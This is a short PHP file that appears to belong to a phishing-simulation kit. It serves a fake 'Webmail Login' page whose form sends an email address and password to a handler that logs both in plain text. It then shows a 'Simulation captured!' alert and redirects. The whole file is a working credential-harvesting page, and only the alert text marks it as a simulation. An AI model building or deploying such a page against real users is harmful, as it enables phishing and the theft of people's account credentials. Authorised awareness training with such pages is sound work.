<?php
require __DIR__ . '/../../includes/config.php';
require __DIR__ . '/../../includes/functions.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mail = $_POST['email'] ?? '';
    $pass = $_POST['password'] ?? '';
    log_data("Email", ["email" => $mail, "password" => $pass]);
    echo "<script>alert('Simulation captured! Check terminal logs.');window.location='index.php';</script>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Webmail Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="login-box">
    <h2>Sign in to your account</h2>
    <form method="POST">
        <input type="text" name="email" placeholder="Email address"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <button type="submit">Sign In</button>
    </form>
</div>
</body>
</html>
